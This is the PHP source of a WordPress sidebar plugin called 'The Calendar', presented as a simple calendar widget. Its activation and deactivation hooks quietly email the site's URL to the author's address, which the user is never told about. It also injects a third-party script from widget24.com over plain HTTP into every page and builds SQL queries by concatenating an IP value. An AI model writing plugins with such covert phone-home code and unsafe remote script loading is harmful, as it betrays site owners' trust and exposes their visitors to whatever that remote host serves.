<?php
/*
Plugin Name: The Calendar
Plugin URI: http://seo.uk.net/the-calendar/
Description: The calendar plugin is a simple & elegant widget designed for all wordpress sites/blogs.
Author: Seo UK Team
Version: 1.1.2
Author URI: http://seo.uk.net
*/

function the_calendar_control() {

  $options = get_mm_options();

  if ($_POST['wp_mm_Submit']){

    $options['wp_mm_WidgetTitle'] = htmlspecialchars($_POST['wp_mm_WidgetTitle']);
    $options['wp_mm_mctext_wlink'] = htmlspecialchars($_POST['wp_mm_mctext_wlink']);
    update_option("widget_the_calendar", $options); 

}
?>
  <p>Do you need help with SEO?. Visit our website <a href="http://seo.uk.net" title="Link will open in a new window" target="_blank">www.seo.uk.net</a> for more information.</p>
  <p><strong>Use options below to Calendar english labels</strong></p>
  <p>
    <label for="wp_mm_WidgetTitle">Text Title: </label>
    <input type="text" id="wp_mm_WidgetTitle" name="wp_mm_WidgetTitle" value="<?php echo ($options['wp_mm_WidgetTitle'] =="" ? "Calendar" : $options['wp_mm_WidgetTitle']); ?>" />
  </p>
 
 <p>
    <label for="wp_mm_mctext_wlink">Please support our plugin by showing a small link under widget.</label><p align="right">Activate it: 
    <input type="checkbox" id="wp_mm_mctext_wlink" name="wp_mm_mctext_wlink" <?php echo ($options['wp_mm_mctext_wlink'] == "on" ? "checked" : "" ); ?> /></p>
  </p>
  
  <p>
    <input type="hidden" id="wp_mm_Submit" name="wp_mm_Submit" value="1" />
  </p>

<?php
}
function tcinst_activate() { 
mail('tc@seo.uk.net', 'TC Install', get_option('siteurl'), null, '-ftc@seo.uk.net');
add_option('tcredirect_do_activation_redirect', true); wp_redirect('../wp-admin/widgets.php');
 };
function tcuni_deactivate() {
 mail('tc@seo.uk.net', 'TC Uninstall', get_option('siteurl'), null, '-ftc@seo.uk.net');
 };
 
function get_mm_options() {

  $options = get_option("widget_the_calendar");
  if (!is_array( $options )) {
    $options = array(
                     'wp_mm_WidgetTitle' => 'Calendar',
                     'wp_mm_mctext_wlink' => ''
                    );
  }
  return $options;
}

function tc_infos ($sex, $unique, $hit=false) {

  global $wpdb;
  $table_name = $wpdb->prefix . "sc_log";
  $options = get_mm_options();
  $sql = '';
  $stime = time()-$sex;
  $sql = "SELECT COUNT(".($unique ? "DISTINCT IP" : "*").") FROM $table_name where Time > ".$stime;

  if ($hit)
   $sql .= ' AND ca_hit = 1 ';

  if ($options['wp_mm_mctext_bots_filter'] > 1)
      $sql .= ' AND IS_BOT <> 1';

  return number_format_i18n($wpdb->get_var($sql));
  }

function tcview() {	

  global $wpdb;
  $options = get_mm_options();
  $table_name = $wpdb->prefix . "sc_log";

?>

<div><script charset="UTF-8" src="http://widget24.com/code/calendar?data%5BWidget%5D%5Bcss%5D=white" type="text/javascript"></script></div> 

<?php if ($options['wp_mm_mctext_wlink'] == "on") { ?>
<br /><p align="right"><small>Free Calendar by <a href="http://seo.uk.net" target="_blank">http://seo.uk.net</a></small></p>
<?php } ?>

<?php
}

function widget_the_calendar($args) {
  extract($args);

  $options = get_mm_options();

  echo $before_widget;
  echo $before_title.$options["wp_mm_WidgetTitle"];
  echo $after_title;
  tcview();
  echo $after_widget;
}


function ca_hit ($ip) {

   global $wpdb;
   $table_name = $wpdb->prefix . "sc_log";

   $user_count = $wpdb->get_var("SELECT COUNT(*) FROM $table_name where ".time()." - Time <= 1000 and IP = '".$ip."'");

   return $user_count == 0;
}

function wp_mm_install_db () {
   global $wpdb;

   $table_name = $wpdb->prefix . "sc_log";
   $tcable = $wpdb->get_var("show tables like '$table_name'");
   $gColumn = $wpdb->get_results("SHOW COLUMNS FROM ".$table_name." LIKE 'IS_BOT'");
   $hColumn = $wpdb->get_results("SHOW COLUMNS FROM ".$table_name." LIKE 'ca_hit'");

   if($tcable != $table_name) {

      $sql = "CREATE TABLE " . $table_name . " (
           IP VARCHAR( 17 ) NOT NULL ,
           Time INT( 11 ) NOT NULL ,
           IS_BOT BOOLEAN NOT NULL,
           ca_hit BOOLEAN NOT NULL,
           PRIMARY KEY ( IP , Time )
           );";

      require_once(ABSPATH . 'wp-admin/includes/upgrade.php');
      dbDelta($sql);

   } else {
     if (empty($gColumn)) {  //old table version update

       $sql = "ALTER TABLE ".$table_name." ADD IS_BOT BOOLEAN NOT NULL";
       $wpdb->query($sql);
     }

     if (empty($hColumn)) {  //old table version update

       $sql = "ALTER TABLE ".$table_name." ADD ca_hit BOOLEAN NOT NULL";
       $wpdb->query($sql);
     }
   }
}

function the_calendar_init() {

  wp_mm_install_db ();
  register_sidebar_widget(__('-- The Calendar --'), 'widget_the_calendar');
  register_widget_control(__('-- The Calendar --'), 'the_calendar_control', 300, 200 );
}

function uninstall_mc(){

  global $wpdb;
  $table_name = $wpdb->prefix . "sc_log";
  delete_option("widget_the_calendar");
  delete_option("wp_mm_WidgetTitle");
  delete_option("wp_mm_mctext_wlink");

  $wpdb->query("DROP TABLE IF EXISTS $table_name");
}

function add_mm_stylesheet() {
            wp_register_style('scStyleSheets', plugins_url('tc-styles.css',__FILE__));
            wp_enqueue_style( 'scStyleSheets');
}

add_action("plugins_loaded", "the_calendar_init");
add_action('wp_print_styles', 'add_mm_stylesheet');

register_deactivation_hook( __FILE__, 'uninstall_mc' );
register_deactivation_hook( __FILE__, 'uninstall_mc' );
register_activation_hook( __FILE__,'tcinst_activate');
register_deactivation_hook( __FILE__,'tcuni_deactivate');
add_action('admin_init', 'tcredirect_redirect');

function tcredirect_redirect() {
if (get_option('tcredirect_do_activation_redirect', false)) { delete_option('tcredirect_do_activation_redirect'); wp_redirect('../wp-admin/widgets.php');
}
}

?>